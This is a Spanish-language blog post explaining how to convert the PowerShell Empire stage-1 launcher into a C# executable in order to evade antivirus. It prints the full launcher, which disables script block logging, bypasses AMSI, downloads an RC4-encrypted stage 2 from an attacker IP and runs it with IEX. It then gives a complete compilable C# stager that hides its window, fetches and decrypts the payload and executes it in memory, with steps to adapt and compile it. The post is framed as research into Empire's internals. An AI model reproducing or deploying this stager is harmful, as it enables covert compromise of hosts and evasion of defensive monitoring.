---
title: Evasión de AV convirtiendo el Stage 1 de PowerEmpire a CSharp
classes: wide
---

English [here](/AV-Evasion-Converting-PowerEmpire-Stage-1-to-CSharp-EN/)

¿Cómo puedo ejecutar PowerEmpire usando un .exe en lugar de un comando de PowerShell? Me hice esta pregunta y decidí ver qué hace el comando de PowerShell Empire y lo repliqué en C #.

Como todos sabemos, PowerShell puede usar clases .Net, que hacen de PowerShell un lenguaje de scripts sólido. Esta es una de las razones por las que Defensores y Atacantes comenzaron a usar PowerShell. Algunas de las herramientas más populares de uso ofensivo de PowerShells son [BloodHound](https://github.com/BloodHoundAD/BloodHound), [PowerEmpire](https://github.com/EmpireProject/Empire), [PowerSploit](https://github.com/PowerShellMafia/PowerSploit), [Nishang tools](https://github.com/samratashok/nishang), por mencionar algunas.

Debido a que PowerShell ha sido muy utilizado por los atacantes, Microsoft comenzó a introducir algunos controles de seguridad que permiten monitorear más a PowerShell.

Comencemos con el análisis de PowerEmpire Launcher. Antes que nada, ¿qué es PowerShell Empire? Se trata de un framework de post-exploitation que utiliza PowerShell y comunicaciones seguras desde el punto de vista criptológico. Si necesita más información sobre este proyecto, visite [www.powershellempire.com](www.powershellempire.com).

PowerEmpire tiene muchas formas de ejecución que puedes elegir para lanzar tu ataque, para Windows incluye dll, macro, hta, bat, vbs, shellcode, etc. Entonces, ¿por qué decidí crear un código C# para Empire si ya hay uno? Bueno, digamos que quería entender qué hace Empire, cómo lo hace y me preguntaba si podría crear mi propio código.

Así es cómo se genera un Launcher:

![pse_launcher](/assets/images/pse_launcher.png)

Este es el script decodificado:

```
If($PSVErSioNTaBLe.PSVErSIoN.MAjor -gE 3){$GPF=[rEf].AsSeMblY.GetTYpE('System.Management.Automation.Utils')."GeTFie`Ld"('cachedGroupPolicySettings','N'+'onPublic,Static');If($GPF){$GPC=$GPF.GeTValUE($NULL);IF($GPC['ScriptB'+'lockLogging']){$GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$Val=[ColLECTionS.GENeric.DIcTiOnarY[STriNG,SystEm.Object]]::NEw();$vAL.ADD('EnableScriptB'+'lockLogging',0);$VAL.AdD('EnableScriptBlockInvocationLogging',0);$GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$vAL}ElSe{[ScRIPtBloCk]."GETFIE`lD"('signatures','N'+'onPublic,Static').SetVALUe($nuLl,(New-OBJect COllEcTIONs.GenErIC.HASHSet[sTRInG]))}[REF].AsSEMBLY.GEtTypE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIeld('amsiInitFailed','NonPublic,Static').SETVALUe($null,$true)};};[SystEM.NeT.SErvicEPOINTManAGeR]::EXPeCt100CoNTinUe=0;$wC=New-ObJecT SYsTem.NET.WeBCLIENt;$u='Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)';$WC.HEaDERS.ADd('User-Agent',$u);$wC.PRoxY=[SYsteM.NET.WEbRequest]::DeFAulTWEbPROxY;$wC.Proxy.CREdentIaLs = [SyStEM.NEt.CReDenTiaLCACHE]::DefAultNEtWorkCReDEntiALs;$Script:Proxy = $wc.Proxy;$K=[SYsTEm.TEXT.ENcODinG]::ASCII.GeTBYtEs('fdcece0a22c10f83dccc8f17c95a33d4');$R={$D,$K=$ARGs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}};$ser='http://192.168.6.119:80';$t='/CWoNaJLBo/VTNeWw11212/';$wc.HeADeRs.AdD("Accept","image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*");$Wc.HeaDeRs.Add("Accept-Language","en-en");$WC.HEADErS.AdD("Cookie","session=pRWdj48/Lf2wTAhO2Y7BXpRHz6o=");$DAtA=$WC.DOWnlOADDAtA($SEr+$T);$iv=$datA[0..3];$Data=$DATa[4..$DATA.LENgTh];-jOiN[ChaR[]](& $R $Data ($IV+$K))|IEX
```

Este es el mismo script, pero eliminé algunas ofuscaciones para obtener una mejor vista:

```
If($PSVErSioNTaBLe.PSVErSIoN.MAjor -gE 3)
{
	$GPF=[rEf].AsSeMblY.GetTYpE('System.Management.Automation.Utils')."GeTFieLd"('cachedGroupPolicySettings','NonPublic,Static');
	If($GPF)
	{
		$GPC=$GPF.GeTValUE($NULL);
		IF($GPC['ScriptBlockLogging'])
		{
			$GPC['ScriptBlockLogging']['EnableScriptBlockLogging']=0;
			$GPC['ScriptBlockLogging']['EnableScriptBlockInvocationLogging']=0
		}
		$Val=[ColLECTionS.GENeric.DIcTiOnarY[STriNG,SystEm.Object]]::NEw();
		$vAL.ADD('EnableScriptBlockLogging',0);
		$VAL.AdD('EnableScriptBlockInvocationLogging',0);
		$GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']=$vAL
	}
	ElSe
	{
		[ScRIPtBloCk]."GETFIElD"('signatures','NonPublic,Static').SetVALUe($nuLl,(New-OBJect COllEcTIONs.GenErIC.HASHSet[sTRInG]))
	}
	[REF].AsSEMBLY.GEtTypE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIeld('amsiInitFailed','NonPublic,Static').SETVALUe($null,$true)};
};
[SystEM.NeT.SErvicEPOINTManAGeR]::EXPeCt100CoNTinUe=0;
$wC=New-ObJecT SYsTem.NET.WeBCLIENt;
$u='Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)';
$WC.HEaDERS.ADd('User-Agent',$u);
$wC.PRoxY=[SYsteM.NET.WEbRequest]::DeFAulTWEbPROxY;
$wC.Proxy.CREdentIaLs = [SyStEM.NEt.CReDenTiaLCACHE]::DefAultNEtWorkCReDEntiALs;
$Script:Proxy = $wc.Proxy;
$K=[SYsTEm.TEXT.ENcODinG]::ASCII.GeTBYtEs('fdcece0a22c10f83dccc8f17c95a33d4');
$R={$D,$K=$ARGs;
$S=0..255;
0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;
$S[$_],$S[$J]=$S[$J],$S[$_]};
$D|%{$I=($I+1)%256;
$H=($H+$S[$I])%256;
$S[$I],$S[$H]=$S[$H],$S[$I];
$_-bXOr$S[($S[$I]+$S[$H])%256]}};
$ser='http://192.168.6.119:80';
$t='/CWoNaJLBo/VTNeWw11212/';
$wc.HeADeRs.AdD("Accept","image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*");
$Wc.HeaDeRs.Add("Accept-Language","en-en");
$WC.HEADErS.AdD("Cookie","session=pRWdj48/Lf2wTAhO2Y7BXpRHz6o=");
$DAtA=$WC.DOWnlOADDAtA($SEr+$T);
$iv=$datA[0..3];
$Data=$DATa[4..$DATA.LENgTh];
-jOiN[ChaR[]](& $R $Data ($IV+$K))|IEX
```

A continuación, eliminemos la parte del IF, para simplificar, y enfoquémonos en el resto del código. También organicé un poco el código, para poder agrupar las partes que funcionan juntas y explicar cada una por separado.

```
[System.Net.ServicePointManager]::Expect100Continue=0;
 
$wc=New-Object System.Net.WebClient;
$u='Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)';
$wc.Headers.Add('User-Agent',$u);
$wc.Headers.Add("Accept","image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*");
$wc.Headers.Add("Accept-Language","en-en");
$wc.Headers.Add("Cookie","session=pRWdj48/Lf2wTAhO2Y7BXpRHz6o=");
 
$wc.PRoxY=[System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$Script:Proxy = $wc.Proxy;
 
$ser='http://192.168.6.119:80';
$t='/CWoNaJLBo/VTNeWw11212/';
$data=$wc.DownloadData($ser+$t);
 
$K=[System.Text.Encoding]::ASCII.GetBytes('fdcece0a22c10f83dccc8f17c95a33d4');
$iv=$data[0..3];
$data=$data[4..$data.Length];
 
$R={$D,$K=$ARGs;
$S=0..255;
0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;
$S[$_],$S[$J]=$S[$J],$S[$_]};
$D|%{$I=($I+1)%256;
$H=($H+$S[$I])%256;
$S[$I],$S[$H]=$S[$H],$S[$I];
$_-bXOr$S[($S[$I]+$S[$H])%256]}};
 
-Join[Char[]](& $R $data ($IV+$K))|IEX
```

Ahora tenemos que convertir cada parte de este código en C#. Disfruté mucho aprendiendo algunas clases .Net mientras hacía esta investigación. Comencemos línea por línea.
 
# De PowerShell a C#.
 
El **System.Net.ServicePointManager.Expect100Continue** en palabras simples, esta propiedad si es verdadera, las solicitudes del cliente que usan los métodos PUT y POST agregarán un encabezado Expect a la solicitud. Para más información, consulte el [enlace](https://msdn.microsoft.com/en-us/library/system.net.servicepointmanager.expect100continue(v=vs.110).aspx)

```
# PowerShell avoid sending Expect 100 Header 
[System.Net.ServicePointManager]::Expect100Continue=0;
 
// C# avoid sending Expect 100 Header 
System.Net.ServicePointManager.Expect100Continue = false;
```

# Conexión al Servidor 

El siguiente punto que tenemos es el objeto **Web.Client**, lo usamos para comunicarnos con el servidor Empire que aloja la segunda etapa (stage 2).
 
Básicamente, la primera etapa (stage 1) es responsable de crear una conexión con la máquina atacante y ejecutar en la memoria la segunda parte (stage 2) (que generalmente es más grande). A veces se hace referencia como stage0 y stage1. Si desea saber más sobre la ejecución en etapas o stages de los malware puede consultar esta [documentación de Metasploit](https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/).
 
El objeto **Web.Client** incluye todas las piezas para realizar la comunicación web. En caso de que el objetivo esté utilizando un proxy para comunicarse con otras redes, las propiedades **DefaultWebProxy** y **DefaultNetworkCredentials** se utilizan para proporcionar Autenticación y conexión a través del Servidor Proxy, si es necesario. No convertí la parte de proxy del código, no fue necesario para mi investigación, depende de usted convertirlo si lo necesita.

```
# PowerShell Create WebClient Object
$wc=New-Object System.Net.WebClient;
$u='Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)';
$wc.Headers.Add('User-Agent',$u);
$wc.Headers.Add("Accept","image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*");
$wc.Headers.Add("Accept-Language","en-en");
$wc.Headers.Add("Cookie","session=pRWdj48/Lf2wTAhO2Y7BXpRHz6o=");
 
# PowerShell Use Default Web Proxy if Enabled
$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$Script:Proxy = $wc.Proxy;
 
// C# Create a WebClient Object
WebClient wc = new WebClient();
string ua = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
wc.Headers["User-Agent"] = ua;
wc.Headers["Cookie"] = "session=968PH6bE9CDkwYGfsUPraz0x5PQ=";
```

Luego, debemos especificar la dirección del servidor, el puerto y la ubicación de destino, en nuestro caso esta es la URL completa http://192.168.6.119:80/CWoNaJLBo/VTNeWw11212/. Después de eso, llamamos al método DownloadData de la clase Web.Client para guardar los datos en la variable $data. Si tienes curiosidad acerca de los datos con tenidos en esta $data (stage 2) generalmente se encuentra en /opt/Empire/data/agent/stagers/http.ps1.

```
# PoweShell Set Server Address and Download the data.
$ser='http://192.168.6.119:80';
$t='/CWoNaJLBo/VTNeWw11212/';
$data=$wc.DownloadData($ser+$t); # Download
 
// C# Set Server Address and Download the data.
string server = "http://192.168.6.119:8081";
string target = "/CWoNaJLBo/VTNeWw11212/";
byte[] data = wc.DownloadData(server + target); // Download
```

# Comunicación Criptológicamente Segura
 
Una de las mejores cosas de Empire, y por qué es tan difícil de detectar para los IPS, es que asegura criptológicamente la comunicación mediante el uso de cifrado de flujo RC4. Harmj0y, uno de los colaboradores de PowerEmpire, creó una publicación de blog sobre la implementación de RC4 en PowerShell. Te invito a leer sobre ella en su [publicación](https://www.harmj0y.net/blog/powershell/powershell-rc4/)
 
Para que **RC4** funcione, necesitaremos 3 piezas, la **clave ($K)**, un **valor aleatorio (denominado $ IV)** y los **datos (stage 2)**.
 
La **clave** se genera cuando ejecuta su Launcher, en PowerEmpire se llama **StagingKey**.

![pse_stagingkey](/assets/images/pse_stagingkey.png)

```
// PowerShell Key Value for Decryption
$K=[System.Text.Encoding]::ASCII.GetBytes('fdcece0a22c10f83dccc8f17c95a33d4');
 
// C# Key value for decryption
string key = "fdcece0a22c10f83dccc8f17c95a33d4";
byte[] K = Encoding.ASCII.GetBytes(key);
```

El **IV** es un valor aleatorio que obtuvimos de los datos (stage 2) que descargamos, ese valor son los primeros 4 bytes del conjunto de datos. El IV es responsable de hacer aleatoria la comunicación con el servidor de Empire, ya que este valor es elegido al azar cada vez que descarga la segunda etapa (stage 2).

```
// PowerShell Extract IV from data
$iv=$data[0..3];
 
// C# Extract IV from data
byte[] iv = data.Take(4).Select(i => i).ToArray();
 
Finalmente, eliminamos el IV de los datos, porque esos no son datos solo ese valor aleatorio:
 
// PowerShell Remove IV from data
$data=$data[4..$data.Length];
 
// C# Remove the IV from the data
byte[] data_noIV = data.Skip(4).ToArray();
```

# Cifrado RC4
 
Aquí es donde ocurre toda la magia, si hiciste clic en el enlace sobre la publicación del blog Harm0jy sobre RC4, entenderás qué es este fragmento de código, esta es la minimización de la implementación de RC4 para descifrar o ejecutar comunicaciones de malware. Para C# encontré 2 clases de RC4 que copio y pegar aquí, la que utilicé en el código fue creada por Jeong ChangWook, [aquí su fuente](https://gist.github.com/hoiogi/89cf2e9aa99ffc3640a4)

```
// PowerShell RC4 function to decrypt the stage 2 data.
$R={$D,$K=$ARGs;
$S=0..255;
0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;
$S[$_],$S[$J]=$S[$J],$S[$_]};
$D|%{$I=($I+1)%256;
$H=($H+$S[$I])%256;
$S[$I],$S[$H]=$S[$H],$S[$I];
$_-bXOr$S[($S[$I]+$S[$H])%256]}};
 
// C# RC4 Class to decrypt the stage 2 data
// Created by Jeong ChangWook. Source https://gist.github.com/hoiogi/89cf2e9aa99ffc3640a4
public class RC4
{
	public static byte[] Encrypt(byte[] pwd, byte[] data)
	{
		int a, i, j, k, tmp;
		int[] key, box;
		byte[] cipher;

		key = new int[256];
		box = new int[256];
		cipher = new byte[data.Length];

		for (i = 0; i < 256; i++)
		{
			key[i] = pwd[i % pwd.Length];
			box[i] = i;
		}
		for (j = i = 0; i < 256; i++)
		{
			j = (j + box[i] + key[i]) % 256;
			tmp = box[i];
			box[i] = box[j];
			box[j] = tmp;
		}
		for (a = j = i = 0; i < data.Length; i++)
		{
			a++;
			a %= 256;
			j += box[a];
			j %= 256;
			tmp = box[a];
			box[a] = box[j];
			box[j] = tmp;
			k = box[((box[a] + box[j]) % 256)];
			cipher[i] = (byte)(data[i] ^ k);
		}
		return cipher;
	}

	public static byte[] Decrypt(byte[] pwd, byte[] data)
	{
		return Encrypt(pwd, data);
	}
}
```

La última parte es responsable de unir todo junto. Podemos dividir el Join en 2 piezas, la 1ª es la parte de descifrado RC4 que utiliza el script de minimización de $R, los datos como argumento y la combinación de IV + K como el valor de descifrado. Puede ejecutar **& $R $data ($IV + $K)** solo para que pueda ver el RC4 en acción, y luego unir todo para finalmente hacer la ejecución Invoke-Execution (IEX).

```
//PowerShell Code
-Join[Char[]](& $R $data ($IV+$K))|IEX
 
// C# Code
// Combine the IV + Key (New random key each time)
byte[] IVK = new byte[iv.Length + K.Length];
iv.CopyTo(IVK, 0);
K.CopyTo(IVK, iv.Length);
 
// Decrypt the Message
byte[] decrypted = RC4.Decrypt(IVK, data_noIV);
 
// Convert the stage2 decrypted message from bytes to ASCII
string stage2 = System.Text.Encoding.ASCII.GetString(decrypted);
```

# Ejecución de C#.

Para ejecutar código en C# podemos usar la clase **PowerShell** o las clases **RunSpace** y **Pipeline**, esto es porque el payload que descargamos de la etapa 2 está en PowerShell. Utilizaremos la clase PowerShell porque, por alguna razón, las clases RunSpace y Pipeline no me funcionaron. En PowerShell, lo ejecutamos usando Invoke-Execution o IEX.

```
// Create a PowerShell Object to execute the command 
PowerShell PowerShellInstance = PowerShell.Create();
 
// Add the Script Stage 2 to the Powershell Object
PowerShellInstance.AddScript(stage2);
 
// Execute the Script!
PowerShellInstance.Invoke();
```

Antes de usar el método Invoke(), necesitamos agregar dos variables a la ecuación, que son **$ser** y **$u**. Si observas el valor de los datos (stage 2), notarás que ejecuta una llamada de función de **Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u** así que, necesitamos pasar las variables $ser y $u para obtener la ejecución, de lo contrario, obtendríamos un error.

```
// Create the variables $ser and $u which are part of the downloaded stage2
PowerShellInstance.Runspace.SessionStateProxy.SetVariable("ser", server);
PowerShellInstance.Runspace.SessionStateProxy.SetVariable("u", ua);
```

Finalmente, agregué algunas funciones adicionales para ocultar la ventana de cmd, encontrarás más información acerca de cómo hacerlo en los comentarios. Ahora pongamos el código C#  junto y ejecutemos nuestra payload de Empire en C#. El código final debería verse así:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
 
namespace PSEmpire_Stage1
{
    class Program
    {
        // RC4 Class to decrypt the stage 2 data
        // Created by Jeong ChangWook. Source https://gist.github.com/hoiogi/89cf2e9aa99ffc3640a4
        public class RC4
        {
            public static byte[] Encrypt(byte[] pwd, byte[] data)
            {
                int a, i, j, k, tmp;
                int[] key, box;
                byte[] cipher;
 
                key = new int[256];
                box = new int[256];
                cipher = new byte[data.Length];
 
                for (i = 0; i < 256; i++)
                {
                    key[i] = pwd[i % pwd.Length];
                    box[i] = i;
                }
                for (j = i = 0; i < 256; i++)
                {
                    j = (j + box[i] + key[i]) % 256;
                    tmp = box[i];
                    box[i] = box[j];
                    box[j] = tmp;
                }
                for (a = j = i = 0; i < data.Length; i++)
                {
                    a++;
                    a %= 256;
                    j += box[a];
                    j %= 256;
                    tmp = box[a];
                    box[a] = box[j];
                    box[j] = tmp;
                    k = box[((box[a] + box[j]) % 256)];
                    cipher[i] = (byte)(data[i] ^ k);
                }
                return cipher;
            }
 
            public static byte[] Decrypt(byte[] pwd, byte[] data)
            {
                return Encrypt(pwd, data);
            }
 
        }
 
        // Hide Windows function by our friends from StackOverFlow
        // https://stackoverflow.com/questions/34440916/hide-the-console-window-from-a-console-application
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
 
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
        static void Main(string[] args)
        {
            // To Hide the ConsoleWindow (It may be a better way...)
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
 
            // Avoid sending Expect 100 Header 
            System.Net.ServicePointManager.Expect100Continue = false;
 
            // Create a WebClient Object (No Proxy Support Included)
            WebClient wc = new WebClient();
            string ua = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
            wc.Headers["User-Agent"] = ua;
            wc.Headers["Cookie"] = "session=968PH6bE9CDkwYGfsUPraz0x5PQ=";
 
            // Set the Server Address and URL 
            string server = "http://192.168.6.119:8081";
            string target = "/CWoNaJLBo/VTNeWw11212/";
 
            // Download The Data or Stage 2
            byte[] data = wc.DownloadData(server + target);
 
            // Extract IV
            byte[] iv = data.Take(4).Select(i => i).ToArray();
 
            // Remove the IV from the data
            byte[] data_noIV = data.Skip(4).ToArray();
 
            // Set Key value for decryption. PowerEmpire StageingKey value 
            string key = "fdcece0a22c10f83dccc8f17c95a33d4";
            byte[] K = Encoding.ASCII.GetBytes(key);
 
            // Combine the IV + Key (New random key each time)
            byte[] IVK = new byte[iv.Length + K.Length];
            iv.CopyTo(IVK, 0);
            K.CopyTo(IVK, iv.Length);
 
            // Decrypt the Message
            byte[] decrypted = RC4.Decrypt(IVK, data_noIV);
 
            // Convert the stage2 decrypted message from bytes to ASCII
            string stage2 = System.Text.Encoding.ASCII.GetString(decrypted);
 
            // Create a PowerShell Object to execute the command 
            PowerShell PowerShellInstance = PowerShell.Create();
 
            // Create the variables $ser and $u which are part of the downloaded stage2
            PowerShellInstance.Runspace.SessionStateProxy.SetVariable("ser", server);
            PowerShellInstance.Runspace.SessionStateProxy.SetVariable("u", ua);
 
            // Add the Script Stage 2 to the Powershell Object
            PowerShellInstance.AddScript(stage2);
 
            // Execute the Script!
            PowerShellInstance.Invoke();
 
        }
    }
}
```
# Ajustar el Codigo a mi Empire.

Si quieres probar necesitarás modificar este código para incluir tus variables, cambiar **clave (key)**, **servidor (server)**, **destino (target)** y **cookie**. Para obtener esta información de tu Empire ejecuta el comando de launcher (**powershell launcher <Nombre de tu Listener>**), usa **base64 -d** para decodificar el script y verifique esos valores.

Para compilar, puede usar csc.exe y hacer referencia a System.Management.Automation.dll. Ejemplo: guarde su código en PSEmpireStage1.cs y use el símbolo del sistema del desarrollador.

```
csc.exe PSEmpireStage1.cs /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
```

Si aún no te queda claro, puedes revisar el video de como hacerlo: 

{% include video id="la1fr4Mpj-4" provider="youtube" %}
 
Hay mucho más por descubrir para PowerShell Empire, pero para mí fue un buen comienzo. He estado usando PowerEmpire durante casi 6 meses y no sabía todo esto.
 
El proyecto está en mi [GitHub](https://github.com/juliourena/plaintext/blob/master/PowerEmpire/PSEmpireStage1.cs).

**Dios les bendiga!**

**El servir a Cristo, no es una tarea, sino una relación. Amigos de Dios. Jn 15:15** 